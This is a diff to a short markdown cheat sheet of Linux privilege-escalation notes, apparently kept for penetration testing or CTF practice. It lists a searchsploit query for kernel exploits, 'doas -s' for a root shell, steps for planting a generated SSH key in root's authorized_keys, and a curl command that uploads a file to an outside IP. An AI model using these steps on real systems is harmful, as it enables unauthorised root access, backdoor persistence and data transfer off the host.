@@ -122,8 +122,15 @@
 - ``` file {binary}``` can see ELF file architecture
 - useful search: ``` searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8" ```
 
-# doas
+## doas
 - ``` doas -s ``` get root shell
 
 # Services
 1. some linux executable may need terminal to run --> can try to spawn python3 shell
+
+## Upload root key to root account
+1.  ssh-keygen -f root-fake
+2.  put ```root-fake.pub``` to ```/root/.ssh/authorized_keys``` 
+
+### Upload Thru http server
+1. ``` curl {ip}/{file} --upload-file {file}
